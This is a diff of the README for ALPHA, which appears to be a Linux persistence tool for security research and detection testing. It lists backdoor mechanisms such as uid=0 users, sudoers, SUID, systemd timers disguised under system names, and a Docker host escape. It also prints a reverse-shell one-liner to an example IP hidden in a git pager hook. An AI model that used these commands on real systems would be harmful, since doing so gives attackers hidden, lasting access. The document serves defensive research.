@@ -1,6 +1,6 @@
 <p align="center">
   <img src="https://github.com/Aegrah/ALPHA/assets/78494512/2b21f530-9763-4c10-af8c-9ca97443f351" alt="ALPHA logo" width="1010" height="500"> 
-  <h2 align="center"><a href="https://github.com/Aegrah/ALPHA/">ALPHA</a></h2>
+  <h1 align="center"><a href="https://github.com/Aegrah/ALPHA/">ALPHA</a></h1>
 </p>
 
 ![](https://i.imgur.com/waxVImv.png)
@@ -10,31 +10,31 @@ ALPHA is a Linux persistence tool for security research, detection engineering, 
 ![](https://i.imgur.com/waxVImv.png)
 
 # Features
-ALPHA provides a versatile suite of features for simulating and researching Linux persistence mechanisms, which are displayed in the table below:
+ALPHA provides a versatile suite of features for simulating and researching Linux persistence mechanisms.
 
 | Feature                          | Description                                                                             | Root | User |
 |----------------------------------|-----------------------------------------------------------------------------------------|------|------|
 | **At Job Persistence**           | At job persistence                                                                      | ✓    | ✓    |
 | **Authorized Keys Management**   | Add public key to authorized keys                                                       | ✓    | ✓    |
-| **Backdoor User**                | Create backdoor user                                                                    | ✓    | ✗    |
+| **Backdoor User**                | Create backdoor user with uid=0                                                         | ✓    | ✗    |
 | **Bind Shell**                   | Execute backgrounded bind shell                                                         | ✓    | ✓    |
-| **Capabilities Backdoor**        | Add capabilities persistence                                                            | ✓    | ✗    |
+| **Capabilities Backdoor**        | Add capabilities for persistence                                                        | ✓    | ✗    |
 | **Cron Job Persistence**         | Cron job persistence                                                                    | ✓    | ✓    |
 | **Create User**                  | Create a new user                                                                       | ✓    | ✗    |
-| **Git Persistence**              | Git persistence                                                                         | ✓    | ✓    |
-| **Generator Persistence**        | Generator persistence                                                                   | ✓    | ✗    |
-| **Init.d Backdoor**              | SysV Init (init.d) persistence                                                          | ✓    | ✗    |
-| **Malicious Docker Container**   | Docker container with host escape                                                       | ✓    | ✓    |
+| **Git Persistence**              | Git hook/pager persistence                                                              | ✓    | ✓    |
+| **Generator Persistence**        | Systemd generator persistence                                                           | ✓    | ✗    |
+| **init.d Backdoor**              | SysV Init (init.d) persistence                                                          | ✓    | ✗    |
+| **Docker Container Backdoor**    | Docker container with host escape                                                       | ✓    | ✓    |
 | **MOTD Backdoor**                | Message Of The Day (MOTD) persistence                                                   | ✓    | ✗    |
 | **Package Manager Persistence**  | Package Manager persistence (APT/YUM/DNF)                                               | ✓    | ✗    |
 | **Password Management**          | Add user to /etc/passwd directly                                                        | ✓    | ✗    |
 | **Password Change**              | Change user password                                                                    | ✓    | ✗    |
-| **Rc.local Backdoor**            | Run Control (rc.local) persistence                                                      | ✓    | ✗    |
+| **rc.local Backdoor**            | Run Control (rc.local) persistence                                                      | ✓    | ✗    |
 | **Shell Profile Persistence**    | Shell profile persistence                                                               | ✓    | ✓    |
 | **SSH Key Persistence**          | SSH key persistence                                                                     | ✓    | ✓    |
 | **Sudoers Backdoor**             | Sudoers persistence                                                                     | ✓    | ✗    |
 | **SUID Backdoor**                | SUID persistence                                                                        | ✓    | ✗    |
-| **System Binary Backdoor**       | System binary persistence                                                               | ✓    | ✗    |
+| **System Binary Backdoor**       | System binary wrapping for persistence                                                  | ✓    | ✗    |
 | **Systemd Service Persistence**  | Systemd service persistence                                                             | ✓    | ✓    |
 | **Udev Persistence**             | Udev (driver) persistence                                                               | ✓    | ✗    |
 | **XDG Autostart Persistence**    | XDG autostart persistence                                                               | ✓    | ✓    |
@@ -43,7 +43,7 @@ ALPHA provides a versatile suite of features for simulating and researching Linu
 ![](https://i.imgur.com/waxVImv.png)
 
 # Support
-ALPHA offers comprehensive support/compatibility for each of the features across various Linux distributions and environments.
+ALPHA offers comprehensive support across various Linux distributions.
 
 | Distribution | Support     | Tested                                         |
 |--------------|-------------|------------------------------------------------|
@@ -55,36 +55,25 @@ ALPHA offers comprehensive support/compatibility for each of the features across
 | **Arch Linux**   | ✓       | ✗                                              |
 | **OpenSUSE**     | ✓       | ✗                                              |
 
-Some custom Linux distributions may have different paths, causing mechanisms to fail on untested versions. While most persistence mechanisms are supported, older versions may lack specific services. If a default command fails, the `--custom` flag in most features allows you to customize paths/commands to suit your environment. If that doesn't work, you can examine the script to understand and adapt it to your distribution.
+Custom or old Linux distributions may use slightly different configurations or lack specific services, potentially causing mechanisms to fail on untested versions. If a default command fails, the `--custom` flag in most features allows you to customize paths/commands to suit your environment. If that doesn't work, you can examine the script to understand and adapt it to your distribution.
 
-**Contributions through PRs or issues for new features or ideas are welcome!**
+**Contributions via pull requests or issues for new features, updates, or ideas are always welcome!**
 
 ![](https://i.imgur.com/waxVImv.png)
 
-# Setup
-Getting this up-and-running is as simple as downloading the script and execute it.
+# Getting Started
+Getting ALPHA up-and-running is as simple as downloading the script and executing it through any shell of choice.
 ```
 curl ... | bash
 ```
 
-Executing the script will either show the `root` or `user` help menu, dependent on the privileges the current user has.
+Executing the script will either show the `root` or `user` help menu, depending on the privileges the current user has.
 
 ```
 alpha@alpha-demo:~$ sudo ./alpha.sh
-
- ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄
-▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒▒████▄
-▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄
-░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██
- ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒
- ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░
-  ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░
-  ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒
-      ░  ░    ░  ░          ░  ░  ░      ░  ░
-
-Aegrah's Linux Persistence Honed Assistant (ALPHA)
-Github: https://github.com/Aegrah/ALPHA
-Twitter: https://twitter.com/RFGroenewoud
+           __
+ /\  |    |__) |__|  /\
+/~~\ |___ |    |  | /~~\
 
 Root User Options:
 
@@ -137,7 +126,7 @@ Usage: ./alpha.sh --udev [OPTIONS]
   --path <path>                Specify custom path
 ```
 
-Every persistence mechanism also has an --examples flag that shows default and custom examples, helping in crafting the command that works for you.
+Every persistence mechanism also has an `--examples` flag that shows default and custom examples, aiding in crafting the command that works for you.
 ```
 root@ubuntu2204:/home/ruben# ./alpha.sh --git --examples
 Examples:
@@ -149,7 +138,7 @@ Examples:
 
 ./alpha.sh --git --custom --command "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & ${PAGER:-less}" --path "~/.gitconfig --pager"
 ```
-Most of the persistence mechanisms are very simple, and will (hopefully) not require much explanation. For example, Systemd persistence can be set up simply through:
+Most of the persistence mechanisms are very simple, and will (hopefully) not require much explanation. For example, systemd persistence can be set up simply through executing:
 ```
 root@ubuntu2204:/home/ruben# ./alpha.sh --systemd --default --ip 10.10.10.10 --port 1337
 Service file created successfully!
@@ -157,7 +146,7 @@ Timer file created successfully!
 Created symlink /etc/systemd/system/timers.target.wants/dbus-org.freedesktop.resolved.timer → /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer.
 [+] Systemd service persistence established!
 ```
-When setting up a specific persistence mechanism, the script will let you know whether it worked, and in cases where information is needed to work with the persistence mechanism, additional information is provided. For example the bind shell mechanism:
+When setting up a persistence mechanism, the script will let you know whether it worked, and in cases where information is needed to work with the persistence mechanism, additional information is provided. For example the bind shell mechanism:
 ```
 root@ubuntu2204:/home/ruben# ./alpha.sh --bind-shell --default --architecture x64
 [+] Bind shell binary /tmp/bd64 created and executed in the background.
@@ -209,6 +198,22 @@ connect to [192.168.211.131] from (UNKNOWN) [192.168.211.130] 43400
 /usr/local/bin/escape.sh
 root@ubuntu2204:~#
 ```
+
+ALPHA can clean most of its mess through the `--revert` command.
+```
+root@ubuntu2204:/home/ruben# ./alpha.sh --revert
+[*] Running as root...
+[*] Cleaning Systemd persistence methods...
+[+] Successfully cleaned persistence method Systemd
+[*] Cleaning Cron persistence methods...
+[+] Successfully cleaned persistence method Cron
+...
+[*] Cleaning Docker persistence methods...
+[+] Successfully cleaned persistence method Docker
+[*] Cleaning Malicious package persistence methods...
+[+] Successfully cleaned persistence method Malicious package
+```
+
 ![](https://i.imgur.com/waxVImv.png)
 # Publications and Resources
 Publications in which ALPHA is leveraged:
@@ -238,4 +243,4 @@ By sharing [ALPHA](https://github.com/Aegrah/ALPHA), you can assist others in te
 ![](https://i.imgur.com/waxVImv.png)
 
 # Disclaimer
-ALPHA is intended for authorized security testing and research purposes only. Misuse of this tool for malicious activities is not condoned and is entirely at the user's own risk. By using ALPHA, you agree that you are responsible for your own actions.
+ALPHA is intended for authorized security testing and research purposes only. Misuse of this tool for malicious activities is not condoned and is entirely at the user's own risk. By using ALPHA, you agree that you are responsible for your own actions. Just don't do stupid stuff.
